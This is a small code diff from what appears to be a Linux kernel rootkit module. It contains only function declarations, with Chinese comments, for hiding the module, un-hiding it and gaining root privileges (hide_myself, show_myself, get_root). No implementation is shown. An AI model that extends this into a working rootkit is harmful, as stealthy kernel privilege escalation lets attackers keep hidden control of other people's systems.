@@ -31,10 +31,13 @@ static struct file_operations rootkit_fo = {
 static struct list_head *prev;
 
 // 模块隐藏
-static void __init hide_myself(void);
+static void hide_myself(void);
 
-// 提升权限
-void get_root(void);
+// 模块隐藏恢复声明
+static void show_myself(void);
+
+// 提升root权限函数声明
+static void get_root(void);
 
 // 模块加载、卸载函数声明
 static int __init rootkit_init(void);
